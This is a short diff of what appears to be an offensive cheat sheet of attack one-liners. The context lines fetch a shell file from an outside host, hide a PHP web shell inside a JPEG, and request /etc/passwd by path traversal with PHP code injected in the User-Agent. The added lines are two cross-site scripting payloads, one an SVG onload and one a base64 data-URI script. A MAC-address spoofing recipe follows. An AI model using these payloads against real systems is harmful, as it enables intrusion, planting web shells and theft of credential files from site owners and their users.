@@ -7,6 +7,9 @@ curl -o hidden.txt https://url.website.com/shell.txt
 cat file.jpg shell.php > compress.jpg
 curl -u www.servervul.com/page.php?id=/../../etc/passwd -A "<?php system('ls -l'); ?>"
 
+"><svg/onload=alert(document.domain)>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+
 *************Change Mac address(privileges root)*******************
 # ifconfig [interface] down
 # ifconfig [interface] hw ether 00:11:22:33:44:55
